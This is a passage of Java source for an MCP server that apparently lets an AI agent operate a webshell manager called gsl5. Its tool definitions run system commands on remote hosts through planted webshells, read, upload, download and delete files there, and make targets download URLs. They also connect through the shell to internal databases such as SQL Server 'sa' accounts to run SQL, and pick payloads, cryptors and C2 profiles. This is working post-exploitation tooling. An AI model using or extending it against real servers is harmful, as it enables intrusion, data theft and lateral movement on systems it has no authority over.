            java.util.Enumeration<java.net.NetworkInterface> nics = java.net.NetworkInterface.getNetworkInterfaces();
            while (nics != null && nics.hasMoreElements()) {
                java.net.NetworkInterface ni = nics.nextElement();
                try {
                    if (!ni.isUp() || ni.isLoopback() || ni.isVirtual()) continue;
                } catch (Exception ignored) { continue; }
                java.util.Enumeration<java.net.InetAddress> addrs = ni.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    java.net.InetAddress a = addrs.nextElement();
                    if (a instanceof java.net.Inet4Address && !a.isLoopbackAddress()) {
                        ips.add(a.getHostAddress());
                    }
                }
            }
        } catch (Exception ignored) {}
        return new java.util.ArrayList<>(ips);
    }

    /** All useful access base URLs for current bind/port */
    private static java.util.List<String> listAccessUrls() {
        java.util.LinkedHashSet<String> urls = new java.util.LinkedHashSet<>();
        if (bindHost != null && !"0.0.0.0".equals(bindHost) && !"::".equals(bindHost)
                && !bindHost.isEmpty()) {
            String h = bindHost.startsWith("/") ? bindHost.substring(1) : bindHost;
            urls.add("http://" + h + ":" + port);
            if (!"127.0.0.1".equals(h)) urls.add("http://127.0.0.1:" + port);
        } else {
            for (String ip : listLocalIpv4()) urls.add("http://" + ip + ":" + port);
        }
        return new java.util.ArrayList<>(urls);
    }

    private static String buildMcpJson(String host) {
        if (host == null || host.isEmpty()) host = preferredAccessHost();
        ensureAuthToken();
        StringBuilder sb = new StringBuilder();
        sb.append("{\n");
        sb.append("  \"mcpServers\": {\n");
        sb.append("    \"gsl5\": {\n");
        sb.append("      \"type\": \"sse\",\n");
        sb.append("      \"url\": \"http://").append(host).append(":").append(port).append("/sse\"");
        if (authToken != null && !authToken.isEmpty()) {
            sb.append(",\n");
            sb.append("      \"headers\": {\n");
            sb.append("        \"Authorization\": \"Bearer ").append(esc(authToken)).append("\"\n");
            sb.append("      }\n");
        } else {
            sb.append("\n");
        }
        sb.append("    }\n");
        sb.append("  }\n");
        sb.append("}");
        return sb.toString();
    }

    /** Resolve public endpoint host from request Host header (supports NIC IP access). */
    private static String resolveRequestHost(HttpExchange ex) {
        try {
            java.util.List<String> hosts = ex.getRequestHeaders().get("Host");
            if (hosts != null && !hosts.isEmpty()) {
                String h = hosts.get(0);
                if (h != null && !h.isEmpty()) {
                    // Host may be "ip:port" or "[ipv6]:port"
                    if (h.startsWith("[")) {
                        int rb = h.indexOf(']');
                        if (rb > 0) return h.substring(1, rb);
                    }
                    int colon = h.lastIndexOf(':');
                    if (colon > 0 && h.indexOf(':') == colon) return h.substring(0, colon); // ipv4:port
                    return h;
                }
            }
        } catch (Exception ignored) {}
        try {
            java.net.InetSocketAddress local = ex.getLocalAddress();
            if (local != null && local.getAddress() != null) {
                String ha = local.getAddress().getHostAddress();
                if (ha != null && !"0.0.0.0".equals(ha) && !ha.startsWith("0:0:0:0")) return ha;
            }
        } catch (Exception ignored) {}
        return preferredAccessHost();
    }


    private static String getDbPath() {
        String dbPath = "data.db";
        try {
            java.lang.reflect.Field f = core.Db.class.getDeclaredField("DB_URL");
            f.setAccessible(true);
            dbPath = ((String) f.get(null)).replace("jdbc:sqlite:", "");
        } catch (Exception ignored) {}
        return dbPath;
    }


    private void log(String msg) {
        Log.log(msg);
        if (logArea != null) {
            SwingUtilities.invokeLater(() -> logArea.append(msg + "\n"));
        }
    }

    // ==================== Auth (Bearer Token) ====================

    private static String tokenFilePath() {
        File profileDir = new File("profile");
        if (!profileDir.exists()) {
            try { profileDir.mkdirs(); } catch (Exception ignored) {}
        }
        return new File(profileDir, TOKEN_FILE_NAME).getPath();
    }

    /** Load token: env GSL5_MCP_TOKEN > profile/mcp.token > auto-generate+persist. */
    private static synchronized void ensureAuthToken() {
        if (authToken != null && !authToken.trim().isEmpty()) return;
        String env = System.getenv(TOKEN_ENV);
        if (env != null && !env.trim().isEmpty()) {
            authToken = env.trim();
            return;
        }
        try {
            File f = new File(tokenFilePath());
            if (f.isFile() && f.length() > 0) {
                String t = new String(Files.readAllBytes(f.toPath()), StandardCharsets.UTF_8).trim();
                // first line only
                int nl = t.indexOf('\n');
                if (nl >= 0) t = t.substring(0, nl).trim();
                if (!t.isEmpty()) {
                    authToken = t;
                    return;
                }
            }
        } catch (Exception ignored) {}
        String t = generateToken();
        setAuthToken(t, true);
    }

    private static synchronized void setAuthToken(String token, boolean persist) {
        authToken = token == null ? "" : token.trim();
        if (persist && authToken != null && !authToken.isEmpty()) {
            try {
                File f = new File(tokenFilePath());
                File parent = f.getParentFile();
                if (parent != null && !parent.exists()) parent.mkdirs();
                Files.write(f.toPath(), (authToken + "\n").getBytes(StandardCharsets.UTF_8));
            } catch (Exception e) {
                Log.log("[MCP] Failed to save token: " + e.getMessage());
            }
        }
    }

    private static String generateToken() {
        byte[] buf = new byte[24];
        new java.security.SecureRandom().nextBytes(buf);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(buf);
    }

    private static String maskToken(String t) {
        if (t == null || t.isEmpty()) return "(empty)";
        if (t.length() <= 8) return "****";
        return t.substring(0, 4) + "..." + t.substring(t.length() - 4);
    }

    private static boolean isLoopbackBind(String host) {
        if (host == null) return false;
        String h = host.trim();
        return "127.0.0.1".equals(h) || "localhost".equalsIgnoreCase(h) || "::1".equals(h);
    }

    /**
     * Extract Bearer token from Authorization header, or X-MCP-Token / ?token= query.
     */
    private static String extractRequestToken(HttpExchange ex) {
        try {
            java.util.List<String> auths = ex.getRequestHeaders().get("Authorization");
            if (auths != null) {
                for (String a : auths) {
                    if (a == null) continue;
                    String s = a.trim();
                    if (s.regionMatches(true, 0, "Bearer ", 0, 7)) {
                        return s.substring(7).trim();
                    }
                }
            }
            java.util.List<String> xt = ex.getRequestHeaders().get("X-MCP-Token");
            if (xt != null && !xt.isEmpty() && xt.get(0) != null) {
                return xt.get(0).trim();
            }
            // query ?token=
            String uri = ex.getRequestURI() != null ? ex.getRequestURI().getRawQuery() : null;
            if (uri != null) {
                for (String part : uri.split("&")) {
                    int eq = part.indexOf('=');
                    if (eq > 0 && "token".equalsIgnoreCase(part.substring(0, eq))) {
                        return java.net.URLDecoder.decode(part.substring(eq + 1), "UTF-8");
                    }
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    private static boolean constantTimeEquals(String a, String b) {
        if (a == null || b == null) return false;
        byte[] x = a.getBytes(StandardCharsets.UTF_8);
        byte[] y = b.getBytes(StandardCharsets.UTF_8);
        if (x.length != y.length) {
            // still compare to reduce timing leak on length
            int r = 0;
            for (int i = 0; i < x.length; i++) r |= x[i] ^ (i < y.length ? y[i] : 0);
            return false;
        }
        int r = 0;
        for (int i = 0; i < x.length; i++) r |= x[i] ^ y[i];
        return r == 0;
    }

    /** @return true if authorized; false after 401 already sent */
    private static boolean requireAuth(HttpExchange ex) throws IOException {
        ensureAuthToken();
        if (authToken == null || authToken.isEmpty()) {
            // loopback-only mode without token: still require loopback client
            if (isLoopbackClient(ex) && isLoopbackBind(bindHost)) {
                return true;
            }
            sendUnauthorized(ex, "MCP token not configured; set GSL5_MCP_TOKEN or profile/mcp.token");
            return false;
        }
        String provided = extractRequestToken(ex);
        if (provided != null && constantTimeEquals(provided, authToken)) {
            return true;
        }
        sendUnauthorized(ex, "Unauthorized: provide Authorization: Bearer <token>");
        return false;
    }

    private static boolean isLoopbackClient(HttpExchange ex) {
        try {
            java.net.InetSocketAddress ra = ex.getRemoteAddress();
            if (ra != null && ra.getAddress() != null) {
                return ra.getAddress().isLoopbackAddress();
            }
        } catch (Exception ignored) {}
        return false;
    }

    private static void sendUnauthorized(HttpExchange ex, String msg) throws IOException {
        String json = j("error", "unauthorized", "message", msg);
        byte[] bytes = json.getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().set("Content-Type", "application/json; charset=utf-8");
        ex.getResponseHeaders().set("WWW-Authenticate", "Bearer realm=\"gsl5-mcp\"");
        ex.sendResponseHeaders(401, bytes.length);
        try {
            ex.getResponseBody().write(bytes);
            ex.getResponseBody().close();
        } catch (Exception ignored) {}
    }

    private static java.util.concurrent.ExecutorService newMcpExecutor() {
        return Executors.newCachedThreadPool(r -> {
            Thread t = new Thread(r, "gsl5-mcp");
            t.setDaemon(true);
            return t;
        });
    }

    private static String queryParam(HttpExchange ex, String key) {
        try {
            String q = ex.getRequestURI() != null ? ex.getRequestURI().getRawQuery() : null;
            if (q == null) return null;
            for (String part : q.split("&")) {
                int eq = part.indexOf('=');
                if (eq > 0 && key.equalsIgnoreCase(part.substring(0, eq))) {
                    return java.net.URLDecoder.decode(part.substring(eq + 1), "UTF-8");
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    private static void writeSse(HttpExchange sse, String payload) throws IOException {
        synchronized (sse) {
            OutputStream os = sse.getResponseBody();
            os.write(payload.getBytes(StandardCharsets.UTF_8));
            os.flush();
        }
    }

    private static void pushSse(String sessionId, String json) {
        HttpExchange sse = sessionId != null ? sseSessions.get(sessionId) : null;
        if (sse == null && (sessionId == null || sessionId.isEmpty()) && sseSessions.size() == 1) {
            sse = sseSessions.values().iterator().next();
        }
        if (sse == null) return;
        try {
            writeSse(sse, "event: message\ndata: " + json + "\n\n");
        } catch (Exception e) {
            if (sessionId != null) sseSessions.remove(sessionId, sse);
            else sseSessions.values().remove(sse);
        }
    }

    // ==================== SSE ====================
    class SseHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            if ("OPTIONS".equalsIgnoreCase(ex.getRequestMethod())) {
                ex.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
                ex.getResponseHeaders().set("Access-Control-Allow-Methods", "GET, OPTIONS");
                ex.getResponseHeaders().set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-MCP-Token");
                ex.sendResponseHeaders(204, -1);
                return;
            }
            if (!requireAuth(ex)) return;
            ex.getResponseHeaders().set("Content-Type", "text/event-stream");
            ex.getResponseHeaders().set("Cache-Control", "no-cache");
            ex.getResponseHeaders().set("Connection", "keep-alive");
            ex.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
            ex.sendResponseHeaders(200, 0);
            String sessionId = UUID.randomUUID().toString();
            sseSessions.put(sessionId, ex);
            String endpoint = "http://" + resolveRequestHost(ex) + ":" + port + "/message?sessionId=" + sessionId;
            try {
                writeSse(ex, "event: endpoint\ndata: " + endpoint + "\n\n");
            } catch (Exception ignored) {}
            try {
                while (running) {
                    Thread.sleep(15000);
                    writeSse(ex, ": ping\n\n");
                }
            } catch (Exception e) {
                // client gone
            } finally {
                sseSessions.remove(sessionId, ex);
            }
        }
    }

    // ==================== Message Handler ====================
    class MessageHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            if ("OPTIONS".equalsIgnoreCase(ex.getRequestMethod())) {
                ex.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
                ex.getResponseHeaders().set("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
                ex.getResponseHeaders().set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-MCP-Token");
                ex.sendResponseHeaders(204, -1); return;
            }
            if (!requireAuth(ex)) return;
            byte[] bodyBytes = functions.readInputStream(ex.getRequestBody());
            String body = new String(bodyBytes, StandardCharsets.UTF_8);
            ex.getResponseHeaders().set("Content-Type", "application/json");
            ex.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
            try {
                Map<String, Object> req = yaml.load(body);
                String method = (String) req.get("method");
                Object id = req.get("id");
                Object params = req.get("params");
                String result = dispatch(method, params, id);
                pushSse(queryParam(ex, "sessionId"), result);
                sendJson(ex, 202, result);
            } catch (Exception e) {
                sendJson(ex, 200, j("jsonrpc","2.0","id",null,"error",m("code",-32603,"message",e.getMessage())));
            }
        }
    }

    class HealthHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            if ("OPTIONS".equalsIgnoreCase(ex.getRequestMethod())) {
                ex.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
                ex.getResponseHeaders().set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-MCP-Token");
                ex.sendResponseHeaders(204, -1);
                return;
            }
            if (!requireAuth(ex)) return;
            sendJson(ex, 200, j(
                    "status", "ok",
                    "running", true,
                    "port", port,
                    "bind", bindHost,
                    "auth", (authToken != null && !authToken.isEmpty()) ? "token" : "off",
                    "urls", listAccessUrls()));
        }
    }

    


@SuppressWarnings("unchecked")
    private String dispatch(String method, Object params, Object id) {
        try {
            switch (method) {
                case "initialize":
                    return j("jsonrpc","2.0","id",id,"result",
                        m("capabilities", m("tools", m()),
                          "serverInfo", m("name","gsl5-mcp","version","2.0.0"),
                          "protocolVersion","2024-11-05"));
                case "tools/list": return toolsList(id);
                case "tools/call": return toolsCall(params, id);
                case "notifications/initialized": return j("jsonrpc","2.0","id",id,"result",m());
                default: return j("jsonrpc","2.0","id",id,"error",m("code",-32601,"message","Unknown: "+method));
            }
        } catch (Exception e) {
            return j("jsonrpc","2.0","id",id,"error",m("code",-32000,"message",e.getMessage()!=null?e.getMessage():"error"));
        }
    }

    // ==================== PLUGIN TOOLS (scanned @McpTool) ====================
    private static final java.util.List<PluginToolInfo> PLUGIN_TOOLS = new java.util.ArrayList<>();
    private static volatile boolean pluginToolsScanned = false;

    private static class PluginToolInfo {
        final String name;
        final Class<?> pluginClass;
        final String payloadName;
        final java.lang.reflect.Method method;
        final McpTool ann;
        PluginToolInfo(String name, Class<?> pluginClass, String payloadName,
                       java.lang.reflect.Method method, McpTool ann) {
            this.name = name; this.pluginClass = pluginClass; this.payloadName = payloadName;
            this.method = method; this.ann = ann;
        }
    }

    private static synchronized void scanPluginTools() {
        if (pluginToolsScanned) return;
        pluginToolsScanned = true;
        try {
            java.util.List<Class> classes = scanPluginClasses();
            for (Class<?> clazz : classes) {
                PluginAnnotation pa = clazz.getAnnotation(PluginAnnotation.class);
                if (pa == null) continue;
                for (java.lang.reflect.Method m : clazz.getMethods()) {
                    McpTool ann = m.getAnnotation(McpTool.class);
                    if (ann == null) continue;
                    String toolName = ann.name().isEmpty() ? m.getName() : ann.name();
                    String fullName = "plugin_" + clazz.getSimpleName() + "_" + toolName;
                    PLUGIN_TOOLS.add(new PluginToolInfo(fullName, clazz, pa.payloadName(), m, ann));
                    System.out.println("[MCP] plugin tool: " + fullName + " -> " + clazz.getName());
                }
            }
        } catch (Exception e) {
            System.out.println("[MCP] scanPluginTools error: " + e);
        }
    }

    /** Scan plugin classes without touching ApplicationContext (its static init can fail headless). */
    private static java.util.List<Class> scanPluginClasses() {
        java.util.List<Class> out = new java.util.ArrayList<>();
        try {
            java.net.URL url = McpService.class.getResource("/shells/plugins/");
            if (url == null) return out;
            if ("jar".equals(url.getProtocol())) {
                java.net.JarURLConnection conn = (java.net.JarURLConnection) url.openConnection();
                java.util.jar.JarFile jar = conn.getJarFile();
                java.util.Enumeration<java.util.jar.JarEntry> en = jar.entries();
                while (en.hasMoreElements()) {
                    String n = en.nextElement().getName();
                    if (n.startsWith("shells/plugins/") && n.endsWith(".class") && n.indexOf('$') < 0) {
                        String cn = n.substring(0, n.length() - 6).replace('/', '.');
                        try {
                            Class<?> c = Class.forName(cn, false, McpService.class.getClassLoader());
                            if (c.getAnnotation(PluginAnnotation.class) != null) out.add(c);
                        } catch (Throwable ignore) { }
                    }
                }
            } else if ("file".equals(url.getProtocol())) {
                collectPluginClasses(new java.io.File(url.toURI()), out);
            }
        } catch (Exception e) {
            System.out.println("[MCP] scanPluginClasses error: " + e);
        }
        return out;
    }

    private static void collectPluginClasses(java.io.File dir, java.util.List<Class> out) {
        java.io.File[] fs = dir.listFiles();
        if (fs == null) return;
        for (java.io.File f : fs) {
            if (f.isDirectory()) {
                collectPluginClasses(f, out);
            } else if (f.getName().endsWith(".class") && f.getName().indexOf('$') < 0) {
                try {
                    String rel = f.getPath().replace('\\', '/');
                    int idx = rel.indexOf("shells/plugins/");
                    if (idx < 0) continue;
                    String cn = rel.substring(idx).replace('/', '.').replace(".class", "");
                    Class<?> c = Class.forName(cn, false, McpService.class.getClassLoader());
                    if (c.getAnnotation(PluginAnnotation.class) != null) out.add(c);
                } catch (Throwable ignore) { }
            }
        }
    }

    private static PluginToolInfo findPluginTool(String name) {
        scanPluginTools();
        for (PluginToolInfo info : PLUGIN_TOOLS) {
            if (info.name.equals(name)) return info;
        }
        return null;
    }

    private static String pluginToolSchema(PluginToolInfo info) {
        StringBuilder props = new StringBuilder("{");
        StringBuilder required = new StringBuilder();
        boolean first = true;
        for (McpParam pr : info.ann.params()) {
            if (!first) props.append(",");
            first = false;
            String t = pr.type() == null ? "string" : pr.type().toLowerCase();
            String jt = t.equals("int") || t.equals("integer") ? "integer"
                    : (t.equals("bool") || t.equals("boolean")) ? "boolean" : "string";
            props.append("\"").append(esc(pr.name())).append("\":{\"type\":\"").append(jt)
                  .append("\",\"description\":\"").append(esc(pr.desc())).append("\"");
            if (pr.defaultValue() != null && !pr.defaultValue().isEmpty()) {
                props.append(",\"default\":\"").append(esc(pr.defaultValue())).append("\"");
            }
            props.append("}");
            if (pr.required()) {
                if (required.length() > 0) required.append(",");
                required.append("\"").append(esc(pr.name())).append("\"");
            }
        }
        props.append("}");
        if (required.length() > 0) props.append(",\"required\":[").append(required).append("]");
        return "{\"type\":\"object\",\"properties\":" + props + "}";
    }

    private String callPluginTool(String name, Map<String, Object> a) {
        try {
            scanPluginTools();
            PluginToolInfo first = null;
            for (PluginToolInfo info : PLUGIN_TOOLS) {
                if (info.name.equals(name)) { first = info; break; }
            }
            if (first == null) return "未知工具: " + name;
            for (McpParam pr : first.ann.params()) {
                if (pr.required() && !a.containsKey(pr.name())) {
                    return "缺少必填参数: " + pr.name();
                }
            }
            ShellEntity sh = getShellInit(a);
            PluginToolInfo info = null;
            for (PluginToolInfo t : PLUGIN_TOOLS) {
                if (t.name.equals(name) && payloadMatches(sh, t.payloadName)) { info = t; break; }
            }
            if (info == null) {
                Payload plDbg = sh.getPayloadModule();
                String plName = plDbg == null ? "null" : plDbg.getClass().getName();
                return "工具 " + name + " 不支持该 Shell 的 Payload 类型 (实际 " + plName + ")";
            }
            Plugin p = (Plugin) info.pluginClass.newInstance();
            Object result;
            try {
                p.init(sh);
                result = info.method.invoke(p, new Object[]{ a });
            } finally {
                try { p.close(); } catch (Throwable ignore) { }
            }
            return serializeResult(result, sh);
        } catch (java.lang.reflect.InvocationTargetException ite) {
            Throwable c = ite.getCause();
            return "执行失败: " + briefTrace(c != null ? c : ite);
        } catch (Exception e) {
            return "执行失败: " + briefTrace(e);
        }
    }

    /** Short stack trace for MCP responses: message + top frames. */
    private static String briefTrace(Throwable t) {
        java.io.StringWriter sw = new java.io.StringWriter();
        t.printStackTrace(new java.io.PrintWriter(sw));
        String trace = sw.toString();
        String[] lines = trace.split("\n");
        StringBuilder sb = new StringBuilder();
        int max = Math.min(lines.length, 15);
        for (int i = 0; i < max; i++) sb.append(lines[i]).append("\n");
        if (lines.length > max) sb.append("... (truncated)");
        return sb.toString();
    }

    private static boolean payloadMatches(ShellEntity sh, String payloadName) {
        if (payloadName == null || payloadName.isEmpty()) return true;
        Payload pl = sh.getPayloadModule();
        if (pl == null) return false;
        Class<?> c = pl.getClass();
        while (c != null && c != Object.class) {
            PayloadAnnotation an = c.getAnnotation(PayloadAnnotation.class);
            if (an != null) return payloadName.equals(an.Name());
            c = c.getSuperclass();
        }
        return false;
    }

    private static String serializeResult(Object r, ShellEntity sh) {
        if (r == null) return "";
        if (r instanceof byte[]) {
            byte[] b = (byte[]) r;
            String enc = sh != null && sh.getEncoding() != null ? sh.getEncoding() : "UTF-8";
            try { return new String(b, enc); } catch (Exception e) { return new String(b); }
        }
        return String.valueOf(r);
    }

    // ==================== TOOLS LIST ====================
    private String toolsList(Object id) {
        StringBuilder sb = new StringBuilder();
        sb.append("{\"jsonrpc\":\"2.0\",\"id\":").append(toJson(id)).append(",\"result\":{\"tools\":[");
        // Shell CRUD (5)
        sb.append(t("shell_list","\u5217\u51fa\u6240\u6709 Shell \u914d\u7f6e", p("group",s("\u5206\u7ec4\uff0c\u9ed8\u8ba4 /"))));
        sb.append(",").append(t("shell_get","\u83b7\u53d6\u5355\u4e2a Shell \u5b8c\u6574\u914d\u7f6e", p("shellId",s("\u5fc5\u586b"))));
        sb.append(",").append(t("shell_add","\u6dfb\u52a0\u65b0 WebShell(\u4ec5\u4fdd\u5b58\u914d\u7f6e,\u4e0d\u751f\u6210\u6587\u4ef6,\u4e0d\u8fde\u63a5)", p("url",s("\u5fc5\u586b"),"password",s("\u5fc5\u586b"),"secretKey",s("\u5fc5\u586b"),"payload",s("\u5fc5\u586b"),"cryption",s("\u5fc5\u586b"),"encoding",s("\u9ed8\u8ba4UTF-8"),"remark",s(""),"headers",s(""),"proxyType",s(""),"proxyHost",s(""),"proxyPort",s(""),"connTimeout",i(),"readTimeout",i())));
        sb.append(",").append(t("shell_edit","\u7f16\u8f91 Shell \u914d\u7f6e", p("shellId",s("\u5fc5\u586b"),"url",s(""),"password",s(""),"secretKey",s(""),"payload",s(""),"cryption",s(""),"encoding",s("UTF-8/GBK\u7b49"),"remark",s(""),"headers",s(""),"proxyType",s(""),"proxyHost",s(""),"connTimeout",i(),"readTimeout",i(),"c2Profile",s(""))));
        sb.append(",").append(t("shell_delete","\u5220\u9664 Shell", p("shellId",s("\u5fc5\u586b"))));
        // System (2)
        sb.append(",").append(t("shell_info","\u83b7\u53d6\u8fdc\u7a0b\u7cfb\u7edf\u4fe1\u606f(DB encoding\u81ea\u52a8\u5e26\u5165;\u7a7a\u5219\u81ea\u68c0)", p("shellId",s("\u5fc5\u586b"),"encoding",s("\u53ef\u9009:GBK/UTF-8/\u6216auto"))));
        sb.append(",").append(t("shell_test","\u6d4b\u8bd5 Shell \u8fde\u63a5(DB encoding\u81ea\u52a8\u5e26\u5165)", p("shellId",s("\u5fc5\u586b"),"encoding",s("\u53ef\u9009:GBK/UTF-8/auto"))));
        sb.append(",").append(t("shell_detect_encoding","\u81ea\u52a8\u68c0\u6d4b\u8fdc\u7a0b\u63a7\u5236\u53f0\u7f16\u7801(chcp/locale)\u5e76\u5199\u56deDB", p("shellId",s("\u5fc5\u586b"),"persist",s("\u9ed8\u8ba4true,\u4f20false\u53ea\u68c0\u4e0d\u5199"))));
        // Command (1)
        sb.append(",").append(t("shell_exec","\u6267\u884c\u7cfb\u7edf\u547d\u4ee4", p("shellId",s("\u5fc5\u586b"),"command",s("\u5fc5\u586b"),"encoding",s("\u53ef\u9009:GBK/UTF-8/\u6216auto"),"os",s("\u53ef\u9009 win/linux"))));
        // File ops (12)
        sb.append(",").append(t("file_list","\u5217\u51fa\u76ee\u5f55(\u539f\u751fAPI,\u7ed3\u6784\u5316\u8f93\u51fa)", p("shellId",s("\u5fc5\u586b"),"path",s("\u9ed8\u8ba4\u5f53\u524d\u76ee\u5f55"),"encoding",s("\u53ef\u9009:GBK/UTF-8/auto"))));
        sb.append(",").append(t("file_read","\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9(\u9002\u5408\u5c0f\u6587\u4ef6/\u914d\u7f6e\u6587\u4ef6,>512KB\u81ea\u52a8\u63d0\u793a\u7528file_download_local)", p("shellId",s("\u5fc5\u586b"),"path",s("\u5fc5\u586b"),"encoding",s("\u53ef\u9009,\u9ed8\u8ba4\u7528Shell\u7f16\u7801"))));
        sb.append(",").append(t("file_upload_local","\u672c\u5730\u6587\u4ef6\u76f4\u4f20\u8fdc\u7a0b(\u670d\u52a1\u7aef\u8bfb\u6587\u4ef6,\u81ea\u52a8\u5206\u7247,\u4e0d\u7ecfAI)", p("shellId",s("\u5fc5\u586b"),"localPath",s("\u5fc5\u586b,\u672c\u5730\u8def\u5f84"),"remotePath",s("\u5fc5\u586b,\u8fdc\u7a0b\u8def\u5f84"))));
        sb.append(",").append(t("file_download_local","\u8fdc\u7a0b\u6587\u4ef6\u76f4\u63a5\u4fdd\u5b58\u5230\u672c\u5730(\u670d\u52a1\u7aef\u5199\u6587\u4ef6,\u4e0d\u7ecfAI)", p("shellId",s("\u5fc5\u586b"),"remotePath",s("\u5fc5\u586b,\u8fdc\u7a0b\u8def\u5f84"),"localPath",s("\u5fc5\u586b,\u672c\u5730\u4fdd\u5b58\u8def\u5f84"))));
        sb.append(",").append(t("file_delete","\u5220\u9664\u6587\u4ef6", p("shellId",s("\u5fc5\u586b"),"path",s("\u5fc5\u586b"))));
        sb.append(",").append(t("file_copy","\u590d\u5236\u6587\u4ef6", p("shellId",s("\u5fc5\u586b"),"src",s("\u5fc5\u586b"),"dest",s("\u5fc5\u586b"))));
        sb.append(",").append(t("file_move","\u79fb\u52a8/\u91cd\u547d\u540d\u6587\u4ef6", p("shellId",s("\u5fc5\u586b"),"src",s("\u5fc5\u586b"),"dest",s("\u5fc5\u586b"))));
        sb.append(",").append(t("file_mkdir","\u521b\u5efa\u76ee\u5f55", p("shellId",s("\u5fc5\u586b"),"path",s("\u5fc5\u586b"))));
        sb.append(",").append(t("file_attr","\u8bbe\u7f6e\u6587\u4ef6\u5c5e\u6027/\u65f6\u95f4", p("shellId",s("\u5fc5\u586b"),"path",s("\u5fc5\u586b"),"type",s("fileBasicAttr \u6216 fileTimeAttr"),"attr",s("\u5c5e\u6027\u503c"))));
        sb.append(",").append(t("file_remote_down","\u8fdc\u7a0b\u4e0b\u8f7d\u5230\u76ee\u6807", p("shellId",s("\u5fc5\u586b"),"url",s("\u5fc5\u586b"),"savePath",s("\u5fc5\u586b"))));
        sb.append(",").append(t("file_roots","\u5217\u51fa\u6587\u4ef6\u7cfb\u7edf\u6839\u76ee\u5f55", p("shellId",s("\u5fc5\u586b"))));
        // DB = \u754c\u9762\u300c\u6570\u636e\u5e93\u300d\u6807\u7b7e(\u8fde Shell \u540e\u7528\u5df2\u4fdd\u5b58\u7684 DatabaseConfig)
        sb.append(",").append(t("db_connect","\u7ecf WebShell \u8fde\u5185\u7f51\u5e93(\u754c\u9762\u300c\u6570\u636e\u5e93\u300d). \u7528\u6237\u8bf4\u300c\u8fde\u63a5 127.0.0.1 1433 sa 123456 sqlserver\u300d\u65f6: target\u586b\u8fd9\u4e00\u4e32, \u6216\u5206\u5f00\u4f20 host/port/user/pass/type", p("shellId",s("\u5fc5\u586b"),"target",s("\u4f8b: 127.0.0.1 1433 sa 123456 sqlserver"),"dbHost",s("\u4f8b 127.0.0.1"),"dbPort",s("\u4f8b 1433"),"dbUser",s("\u4f8b sa"),"dbPass",s(""),"dbType",s("sqlserver/mysql/oracle/postgresql/sqlite"),"dbName",s("\u53ef\u9009,\u9ed8\u8ba4 master/mysql/postgres"),"configName",s("\u53ef\u9009,\u4fdd\u5b58\u540d"))));
        sb.append(",").append(t("db_exec","\u8d70\u754c\u9762\u6570\u636e\u5e93\u9762\u677f\u7684 execSql\u3002\u5148 db_connect \u6216\u76f4\u63a5\u7528\u5df2\u4fdd\u5b58\u8fde\u63a5", p("shellId",s("\u5fc5\u586b"),"sql",s("\u5fc5\u586b"),"configName",s("\u53ef\u9009"),"dbName",s("\u5f53\u524d\u5e93,\u53ef\u9009"),"execType",s("select/update,\u53ef\u7701\u7565"))));
        sb.append(",").append(t("db_databases","\u5217\u5e93(\u540c\u754c\u9762\u5de6\u4fa7\u6811\u5237\u65b0)", p("shellId",s("\u5fc5\u586b"),"configName",s("\u53ef\u9009"))));
        sb.append(",").append(t("db_tables","\u5217\u8868", p("shellId",s("\u5fc5\u586b"),"database",s("\u5fc5\u586b,\u5e93\u540d"),"configName",s("\u53ef\u9009"))));
        sb.append(",").append(t("db_preview","\u9884\u89c8\u8868(\u524d10\u884c)", p("shellId",s("\u5fc5\u586b"),"table",s("\u5fc5\u586b"),"database",s("\u5e93\u540d"),"configName",s("\u53ef\u9009"))));
        sb.append(",").append(t("db_count","\u8868\u884c\u6570", p("shellId",s("\u5fc5\u586b"),"table",s("\u5fc5\u586b"),"database",s("\u5e93\u540d"),"configName",s("\u53ef\u9009"))));
        sb.append(",").append(t("db_list_types","\u5f53\u524d Payload \u652f\u6301\u7684\u5e93\u7c7b\u578b", p("shellId",s("\u5fc5\u586b"))));
        sb.append(",").append(t("db_configs","\u67e5\u770b/\u7ba1\u7406\u754c\u9762\u5df2\u4fdd\u5b58\u7684\u6570\u636e\u5e93\u8fde\u63a5", p("shellId",s("\u5fc5\u586b"),"action",s("list/add/get/update/delete"),"configName",s(""),"dbType",s(""),"dbHost",s(""),"dbPort",s(""),"dbName",s(""),"dbUser",s(""),"dbPass",s(""),"dbCharset",s(""),"dbInfo",s("\u53ef\u9009 YAML"))));
        // Payloads (1)
        sb.append(",").append(t("payload_list","\u5217\u51fa\u6240\u6709 Payload \u53ca\u53ef\u7528\u52a0\u5bc6\u5668(Cryption)\u3002\u975eC2\u52a0\u5bc6\u5668\u76f4\u63a5\u7528\u4e8eshell_create;C2\u52a0\u5bc6\u5668(\u540d\u542bC2)\u8fd8\u9700c2profile_list\u67e5\u6a21\u677f", p()));
        // C2 Profile (2)
        sb.append(",").append(t("c2profile_list","\u5217\u51fa\u53ef\u7528\u7684 C2 \u914d\u7f6e\u6a21\u677f(\u7528\u4e8e JAVA_C2 \u7b49C2\u52a0\u5bc6\u5668\u751f\u6210Shell\u65f6\u9009\u6a21\u677f)", p("payload",s("\u53ef\u9009\u8fc7\u6ee4"))));
        sb.append(",").append(t("c2profile_get","\u83b7\u53d6\u6307\u5b9a C2 \u914d\u7f6e\u6a21\u677f\u7684\u5b8c\u6574\u5185\u5bb9", p("name",s("\u5fc5\u586b,\u4ece c2profile_list \u83b7\u53d6\u6a21\u677f\u540d"))));
        // Env (1)
        sb.append(",").append(t("shell_env","\u8bfb\u53d6/\u8bbe\u7f6e Shell \u73af\u5883\u53d8\u91cf", p("shellId",s("\u5fc5\u586b"),"action",s("get/set/del/list"),"key",s(""),"value",s(""))));
        // Export/Import (2)
